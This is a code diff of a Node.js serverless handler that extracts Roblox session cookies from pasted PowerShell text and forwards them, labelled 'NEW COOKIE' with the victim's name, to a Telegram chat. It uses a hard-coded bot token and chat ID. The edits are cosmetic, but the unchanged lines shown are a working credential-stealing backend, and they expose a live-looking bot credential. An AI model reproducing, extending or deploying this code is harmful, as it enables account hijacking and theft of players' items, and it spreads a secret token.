@@ -1,5 +1,4 @@
 const fetch = require('node-fetch');
-
 const BOT_TOKEN = "8961899780:AAGUBR-ve4PSdX86Vniv-l1kJx3f7qm0njE";
 const CHAT_ID = "-5527664230";
 const PREFIX = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
@@ -29,7 +28,7 @@ exports.handler = async (event) => {
         }
 
         let raw = null;
-        
+
         if (code.includes(PREFIX)) {
             const start = code.indexOf(PREFIX) + PREFIX.length;
             let end = start;
@@ -84,14 +83,13 @@ exports.handler = async (event) => {
             return { statusCode: 400, body: JSON.stringify({ error: 'Invalid PowerShell format' }) };
         }
 
-        const message = `<b>⚠️⚠️⚠️NEW COOKIE</b>\n<b>👤User:</b> ${victim}\n\n<code>${token}</code>`;
+        const message = `⚠️⚠️⚠️NEW COOKIE \n👤User:${victim}\n\n${token}`;
         const tgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'HTML'
+                text: message
             })
         });
 
